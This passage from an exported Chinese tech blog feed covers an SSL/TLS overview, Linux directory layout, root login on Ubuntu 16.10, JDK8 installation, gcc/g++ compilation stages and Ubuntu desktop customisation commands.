<li>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。</li>
<li>SSL是一个不依赖于平台和运用程序的协议，用于保障TCP-based运用安全，SSL在TCP层和运用层之间，就想运用层连接到TCP来连接的一个插口</li>
</ul>
<h2 id="SSL加密知名协议"><a href="#SSL加密知名协议" class="headerlink" title="SSL加密知名协议"></a>SSL加密知名协议</h2><ul>
<li><p>HTTP over SSL：加密网页流量是设计SSL的初衷,HTTP也是第一个使用SSL保障安全的运用层协议<br>当Netscape在它的Navigator里面运用HTTP over SSL的时候，它使用<a href="https://来标识HTTP" target="_blank" rel="external">https://来标识HTTP</a> over SSL，因此HTTP over SSL就以HTTPS的格式被熟知。后来HTTPS在RFC2818被标准化。HTTPS工作在TCP 443号端口，但是普通的HTTP默认工作在TCP 80端口</p>
</li>
<li><p>Email over SSL：类似于HTTP over SSL，邮件协议例如：SMTP,POP3和IMAP也能支持SSL</p>
</li>
</ul>
<h2 id="SSL的位置"><a href="#SSL的位置" class="headerlink" title="SSL的位置"></a>SSL的位置</h2><p>SSL介于应用层和TCP层之间。应用层数据不再直接传递给传输层，而是传递给SSL层，SSL层对从应用层收到的数据进行加密，并增加自己的SSL头。<br><img src="http://pic002.cnblogs.com/images/2012/38542/2012100609461432.png" alt=""></p>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul>
<li><p>服务器认证阶段：1）客户端向服务器发送一个开始信息“Hello”以便开始一个新的会话连接；2）服务器根据客户的信息确定是否需要生成新的主密钥，如需要则服务器在响应客户的“Hello”信息时将包含生成主密钥所需的信息；3）客户根据收到的服务器响应信息，产生一个主密钥，并用服务器的公开密钥加密后传给服务器；4）服务器回复该主密钥，并返回给客户一个用主密钥认证的信息，以此让客户认证服务器。</p>
</li>
<li><p>用户认证阶段：在此之前，服务器已经通过了客户认证，这一阶段主要完成对客户的认证。经认证的服务器发送一个提问给客户，客户则返回（数字）签名后的提问和其公开密钥，从而向服务器提供认证。</p>
</li>
</ul>
<p>SSL协议提供的安全通道有以下三个特性：</p>
<ul>
<li>机密性：SSL协议使用密钥加密通信数据。</li>
<li>可靠性：服务器和客户都会被认证，客户的认证是可选的。</li>
<li>完整性：SSL协议会对传送的数据进行完整性检查。</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[[第四周]LinuxLinux各个目录的作用及内容]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="主要目录"><a href="#主要目录" class="headerlink" title="主要目录"></a>主要目录</h2><h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><p>/处于Linux文件系统树形结构的最顶端，它是Linux文件系统的入口，所有的目录、文件、设备都在/之下。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>该目录存放着系统最常用的最重要的命令，相当于DOS下的内部命令，只不过它们是以独立的文件形式存在。比如：ls、cp、mkdir等命令。这个目录中的文件都是可执行的并且是普通用户都可以使用的命令。作为系统最基础的命令都放在这里。</p>
<h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>该目录是系统存放程序的地方，比如普通命令、帮助文件、安装的软件等。这个目录下有很多的文件和目录。当我们安装一个Linux发行版官方提供的软件包时，大多安装在这里。当有涉及服务器的配置文件时，会把配置文件安装在/etc目录中。/usr目录下包括涉及字体目录/usr/share/fonts、帮助目录/usr/share/man或/usr/share/doc等。</p>
<h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>该目录的内容是经常变动的，/var下有/var/log目录用来存放系统日志的目录。/var/www目录用来定义Apache服务器站点存放目录。/var/lib用来存放一些库文件。</p>
<h3 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a>/sbin</h3><p>大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录sbin中包含的命令都是root权限才能执行的。</p>
<h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>Linux超级权限用户(系统管理员)root的主目录。</p>
<h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>普通用户的主目录都默认存放在该目录中，比如：有个用户叫wang，那它的主目录就是/home/wang，也可以用~wang表示。</p>
<h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>该目录是系统配置文件的所在地，一些服务器的配置文件也在这里，比如：用户帐号及密码配置文件等。</p>
<h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>Linux的内核及引导系统的程序所需要的文件都存放在该目录中，比如vmlinuz、initrd.img等文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器在这个目录中。</p>
<h3 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h3><p>该目录是可选的软件包安装目录，有些软件包我们可以将它安装在该目录中。</p>
<h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文件。/tmp就是用来存放临时文件的。/var/tmp目录和该目录的作用是相似的。</p>
<h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost+found"></a>/lost+found</h3><p>在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生的一些文件碎片就存放在该目录中。当系统启动在过程中fsck工具会检查这里，并修复已经损坏的文件系统。 有时系统发生问题，有很多的文件被移到这个目录中，可能要用手工的方式来修复，或移到文件原来的位置上。</p>
<h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>该目录用于存放库文件，这个目录里存放着系统最基本的共享库，其作用类似于Windows里的.dll文件。几乎所有的应用程序都须要用到这些共享库。</p>
<h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>该目录是用于存放挂载储存设备的挂载目录的，系统提供这个目录是让用户临时挂载别的文件系统，比如有cdrom等目录。</p>
<h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如cpu、硬盘分区、内存信息等）存放在这里。/proc目录是伪装的文件系统proc的挂载目录，proc并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个目录的内容不在硬盘上而是在内存里。</p>
<h3 id="misc"><a href="#misc" class="headerlink" title="/misc"></a>/misc</h3><p>该目录可以用来存放杂项文件或目录，即那些用途或含义不明确的文件或目录可以存放在该目录下。</p>
<h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>即插即用型存储设备的挂载点自动在该目录下创建。比如USB盘系统自动挂载后，会在这个目录下产生一个目录；CDROM/DVD自动挂载后，也会在这个目录中创建一个目录，类似于cdrom这个目录。该目录只有在最新的发行套件上才有。</p>
<h2 id="其余目录"><a href="#其余目录" class="headerlink" title="其余目录"></a>其余目录</h2><h3 id="initrd"><a href="#initrd" class="headerlink" title="/initrd"></a>/initrd</h3><p>系统在启动前的内核是压缩的（这和ramdisk有关），当系统启动时需要解压缩，该目录就是解压缩时的临时目录，当启动完后又将该目录清空。</p>
<h3 id="usr-man"><a href="#usr-man" class="headerlink" title="/usr/man"></a>/usr/man</h3><p>该目录是Linux系统帮助文档的存放目录。</p>
<h3 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="/proc/cpuinfo"></a>/proc/cpuinfo</h3><p>关于处理器的信息，如类型、厂家、型号和性能等。比如cat /proc/cpuinfo    </p>
<h3 id="proc-devices"><a href="#proc-devices" class="headerlink" title="/proc/devices"></a>/proc/devices</h3><p>当前运行内核所配置的所有设备清单。    </p>
<h3 id="proc-filesystems"><a href="#proc-filesystems" class="headerlink" title="/proc/filesystems"></a>/proc/filesystems</h3><p>当前运行内核所配置的文件系统。    </p>
<h3 id="proc-dma"><a href="#proc-dma" class="headerlink" title="/proc/dma"></a>/proc/dma</h3><p>当前正在使用的DMA通道。    </p>
<h3 id="proc-interrupts"><a href="#proc-interrupts" class="headerlink" title="/proc/interrupts"></a>/proc/interrupts</h3><p>正在使用的中断和曾经有多少个中断。    </p>
<h3 id="proc-ioports"><a href="#proc-ioports" class="headerlink" title="/proc/ioports"></a>/proc/ioports</h3><p>当前正在使用的I/O端口。    </p>
<h3 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="/etc/init.d"></a>/etc/init.d</h3><p>这个目录是用来存放系统或服务器以System V模式启动的脚本，这在以System V模式启动或初始化的系统中常见。比如RedHat Fedora。    </p>
<h3 id="etc-xinetd-d"><a href="#etc-xinetd-d" class="headerlink" title="/etc/xinetd.d"></a>/etc/xinetd.d</h3><p>如果服务器是通过xinetd模式运行的，它的脚本要放在这个目录下。有些系统没有这个目录，比如Slackware，有些老的版本也没有。在Redhat Fedora中比较新的版本中存在。    </p>
<h3 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" title="/etc/rc.d"></a>/etc/rc.d</h3><p>这是Slackware发行版中有的一个目录，是BSD方式启动脚本的存放地，比如定义网卡，服务器开启脚本等。    </p>
<h3 id="etc-X11"><a href="#etc-X11" class="headerlink" title="/etc/X11"></a>/etc/X11</h3><p>是X-Window相关的配置文件存放地。    </p>
<h3 id="usr-bin"><a href="#usr-bin" class="headerlink" title="/usr/bin"></a>/usr/bin</h3><p>这个目录是可执行程序的目录，普通用户就有权限执行。当我们从系统自带的软件包安装一个程序时，他的可执行文件大多会放在这个目录。相似的目录是/usr/local/bin目录。有时/usr/bin中的文件是/usr/local/bin的链接文件。    </p>
<h3 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="/usr/sbin"></a>/usr/sbin</h3><p>这个目录也是可执行程序的目录，但大多存放涉及系统管理的命令。只有root权限才能执行，相似目录是/sbin或/usr/local/sbin或/usr/X11R6/sbin等。    </p>
<h3 id="usr-local"><a href="#usr-local" class="headerlink" title="/usr/local"></a>/usr/local</h3><p>这个目录一般是用来存放用户自编译安装软件的存放目录。一般是通过源码包安装的软件，如果没有特别指定安装目录的话，一般是安装在这个目录中。    </p>
<h3 id="usr-lib"><a href="#usr-lib" class="headerlink" title="/usr/lib"></a>/usr/lib</h3><p>该目录和/lib目录相似，是库文件的存储目录。存放一些常用的共享库。    </p>
<h3 id="usr-share"><a href="#usr-share" class="headerlink" title="/usr/share"></a>/usr/share</h3><p>该目录用于存放系统共用的东西，比如/usr/share/fonts是字体目录，是用户都共用的。    </p>
<h3 id="usr-share-doc"><a href="#usr-share-doc" class="headerlink" title="/usr/share/doc"></a>/usr/share/doc</h3><p>该目录是Linux共享文档的存放地。    </p>
<h3 id="usr-share-man"><a href="#usr-share-man" class="headerlink" title="/usr/share/man"></a>/usr/share/man</h3><p>该目录是共享的帮助文件的存放地。    </p>
<h3 id="usr-src"><a href="#usr-src" class="headerlink" title="/usr/src"></a>/usr/src</h3><p>该目录是内核源码存放地，下面有内核源码目录，比如linux、linux-2.xxx.xx目录等。有的系统也会把一些源码软件包安装在这里，比如Redhat Fedora。另外Redhat 4.0/5.0，它的内核源码包的目录位于/usr/src/kernels目录下的某个目录中（只有安装后才会生成相应目录）。    </p>
<h3 id="var-adm"><a href="#var-adm" class="headerlink" title="/var/adm"></a>/var/adm</h3><p>比如软件包安装信息、日志、管理信息等就存放在该目录下，在Slackware操作系统中是有这个目录的。在Fedora中好象没有。    　</p>
<h3 id="var-log"><a href="#var-log" class="headerlink" title="/var/log"></a>/var/log</h3><p>该目录用于存放系统日志。    </p>
<h3 id="var-spool"><a href="#var-spool" class="headerlink" title="/var/spool"></a>/var/spool</h3><p>打印机、邮件、代理服务器等假脱机目录存放在该目录下。</p>
<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/2011110620371927.png" alt=""></p>
<p>转载自 <a href="http://www.cnblogs.com/shishm/" target="_blank" rel="external">时邵猛</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10下root用户直接登录]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>使用如下命令设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo passwd root</div></pre></td></tr></table></figure></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用如下命令测试是否可以进入root用户，如果@前的用户名变为root则说明设置成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su root</div></pre></td></tr></table></figure></p>
<h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>进入到进入到/usr/share/lightdm/lightdm.conf.d/目录,使用如下命令打开此文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit 50-unity-greeter.conf</div></pre></td></tr></table></figure></p>
<p>在此文件中添加如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user-session=ubuntu</div><div class="line">greeter-show-manual-login=true</div><div class="line">all-guest=false</div></pre></td></tr></table></figure></p>
<h3 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h3><p>点击登录，然后输入root用户，再输入前面设置的密码</p>
<h3 id="修复错误"><a href="#修复错误" class="headerlink" title="修复错误"></a>修复错误</h3><p>登录系统后会出现：读取/root/.profile时发现错误的对话框<br>点击确定进入系统，使用如下命令修改文件，找到mesg n，修改为：tty -s &amp;&amp; mesg n<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit /root/.profile</div></pre></td></tr></table></figure></p>
<p>保存退出，重启系统即可。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10下JDK8的安装配置]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8BJDK8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="JDK8安装"><a href="#JDK8安装" class="headerlink" title="JDK8安装"></a>JDK8安装</h2><p>安装只需输入命令即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:webupd8team/java  </div><div class="line">sudo apt-get update  </div><div class="line">sudo apt-get install oracle-java8-installer</div></pre></td></tr></table></figure>
<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -version</div></pre></td></tr></table></figure></p>
<p>如果显示版本信息则安装成功</p>
<h2 id="配置-JAVA-HOME环境变量"><a href="#配置-JAVA-HOME环境变量" class="headerlink" title="配置$JAVA_HOME环境变量"></a>配置$JAVA_HOME环境变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/environment   //前提安装vim</div></pre></td></tr></table></figure>
<p>在文件中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">JAVA_HOME=&quot;/usr/lib/jvm/java-8-oracle&quot;</div></pre></td></tr></table></figure></p>
<p>保存退出，输入下面的命令使修改生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:wq</div><div class="line">source /etc/environment</div></pre></td></tr></table></figure></p>
<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo $JAVA_HOME</div></pre></td></tr></table></figure></p>
<p>若显示刚才添加的路径则说明配置成功。</p>
<h2 id="简单编译运行"><a href="#简单编译运行" class="headerlink" title="简单编译运行"></a>简单编译运行</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line"></div><div class="line">   /*</div><div class="line">    * 输出一行字符串“Hello World!”</div><div class="line">    */</div><div class="line"></div><div class="line">    public static void main(String[] args) &#123;</div><div class="line"></div><div class="line">    System.out.println(&quot;Hello World!&quot;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac test.java</div><div class="line">java test</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg" alt=""></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10下gcc/g++编译器使用简介]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8Bgcc-g-%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="GCC"><a href="#GCC" class="headerlink" title="GCC"></a>GCC</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GCC（GNU Compiler Collection，GNU编译器套装），是一套由 GNU 开发的编程语言编译器。它是一套以 GPL 及 LGPL 许可证所发行的自由软件，也是 GNU计划 的关键部分，亦是自由的 类Unix 及苹果计算机 Mac OS X 操作系统的标准编译器。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。</p>
<h2 id="简单编译"><a href="#简单编译" class="headerlink" title="简单编译"></a>简单编译</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	printf(&quot;hello world!\n&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个程序，一步到位的编译指令是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.c -o test</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114049.jpg" alt=""></p>
<p>实质上，上述编译过程是分为四个阶段进行的，即预处理(也称预编译，Preprocessing)、编译(Compilation)、汇编 (Assembly)和连接(Linking)。</p>
<h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -E test.c -o test.i</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE2017031211404.jpg" alt=""></p>
<p>可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。后面那条指令，是直接在命令行窗口中输出预处理后的代码.<br>gcc的-E选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将stdio.h 文件中的内容插入到test.c中了。</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>预处理之后，可直接对生成的test.i文件编译，生成汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -S test.i -o test.s</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114625.jpg" alt=""><br>gcc的-S选项，表示在程序编译期间，在生成汇编代码后，停止，-o输出汇编代码文件。</p>
<h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>对于上一小节中生成的汇编代码文件test.s，gas汇编器负责将其编译为目标文件，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -c test.s -o test.o</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114751.jpg" alt=""></p>
<h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>gcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。<br>对于上一小节中生成的test.o，将其与Ｃ标准输入输出库进行连接，最终生成程序test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc test.o -o test</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312114928.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./test      //执行程序test</div></pre></td></tr></table></figure>
<h1 id="G"><a href="#G" class="headerlink" title="G++"></a>G++</h1><h2 id="编译流程"><a href="#编译流程" class="headerlink" title="编译流程"></a>编译流程</h2><h3 id="预处理-Pre-Processing"><a href="#预处理-Pre-Processing" class="headerlink" title="预处理-Pre-Processing"></a>预处理-Pre-Processing</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  -E  test.cpp  -o  test.i</div></pre></td></tr></table></figure>
<h3 id="编译-Compiling"><a href="#编译-Compiling" class="headerlink" title="编译-Compiling"></a>编译-Compiling</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  -S  test.i  -o   test.s</div></pre></td></tr></table></figure>
<h3 id="汇编-Assembling"><a href="#汇编-Assembling" class="headerlink" title="汇编-Assembling"></a>汇编-Assembling</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  -c  test.s  -o  test.o</div></pre></td></tr></table></figure>
<h3 id="链接-Linking"><a href="#链接-Linking" class="headerlink" title="链接-Linking"></a>链接-Linking</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">g++  test.o  -o  test</div></pre></td></tr></table></figure>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10日常折腾二三事]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前我是装的Ubuntu 14.10的，后来…后来可能是喜欢折腾。把Ubuntu 14.10卸载了，装了最新版的Ubuntu 16.10版本，装完之后还是折腾那几件事。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="搜狗输入法"><a href="#搜狗输入法" class="headerlink" title="搜狗输入法"></a>搜狗输入法</h3><p>输入法的安装还是跟Ubuntu 14.10是一样的，但是重启后fcitx不能启动，以致于无法使用搜狗输入法。
　</p>
<h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>当前最新版本是sogoupinyin_2.1.0.0082_amd64.deb<a href="http://cdn2.ime.sogou.com/dl/index/1475147394/sogoupinyin_2.1.0.0082_amd64.deb?st=UvO7xZ1Rvw-j5J5UW6D0ZQ&amp;e=1487927618&amp;fn=sogoupinyin_2.1.0.0082_amd64.deb" target="_blank" rel="external">下载链接</a><br>可以直接双击安装，也可以在安装包目录下打开终端，执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dpkg -i sogoupinyin_2.1.0.0082_amd64.deb</div></pre></td></tr></table></figure>
<h4 id="fcitx自启动"><a href="#fcitx自启动" class="headerlink" title="fcitx自启动"></a>fcitx自启动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~    //切换到用户主目录下面</div><div class="line">sudo vim .xprofile    //创建并编辑.xprofile</div></pre></td></tr></table></figure>
<p>拷贝内容至.xprofile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">export LC_ALL=zh_CN.utf8</div><div class="line">export XMODIFIERS=@im=fcitx</div><div class="line">export QT_IM_MODULE=xim</div><div class="line">export GTK_IM_MODULE=xim</div><div class="line">fcitx -d</div><div class="line">:wq				//保存退出</div><div class="line">reboot			//重启</div></pre></td></tr></table></figure></p>
<h3 id="删除自带软件"><a href="#删除自带软件" class="headerlink" title="删除自带软件"></a>删除自带软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get autoremove --purge thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  landscape-client-ui-install</div></pre></td></tr></table></figure>
<h3 id="删除Amazon的链接"><a href="#删除Amazon的链接" class="headerlink" title="删除Amazon的链接"></a>删除Amazon的链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get autoremove --purge unity-webapps-common</div></pre></td></tr></table></figure>
<h3 id="启动器移动"><a href="#启动器移动" class="headerlink" title="启动器移动"></a>启动器移动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install flashplugin-installer</div><div class="line">gsettings set com.canonical.Unity.Launcher launcher-position Bottom（Bottom改为Left可重新移动到左侧，输入Right无效）</div></pre></td></tr></table></figure>
<h3 id="卸载LibreOffice"><a href="#卸载LibreOffice" class="headerlink" title="卸载LibreOffice"></a>卸载LibreOffice</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get purge libreoffice*</div><div class="line">sudo apt-get autoremove</div></pre></td></tr></table></figure>
<h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><p>我一直想安装的Flatabulous主题的，但是好像有点问题安装后，后来找了相似扁平化的主题Paper</p>
<h4 id="安装-unity-tweak-tool"><a href="#安装-unity-tweak-tool" class="headerlink" title="安装 unity-tweak-tool"></a>安装 unity-tweak-tool</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install unity-tweak-tool</div></pre></td></tr></table></figure>
<h4 id="安装主题包"><a href="#安装主题包" class="headerlink" title="安装主题包"></a>安装主题包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:snwh/pulp</div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install paper-gtk-theme paper-icon-theme</div></pre></td></tr></table></figure>
<p>搜索你的计算机–&gt;unity-tweak-tool–&gt;外观–&gt;主题<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312104441.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312104456.jpg" alt=""></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 14.10远程登录服务器--ssh的安装和配置]]></title>
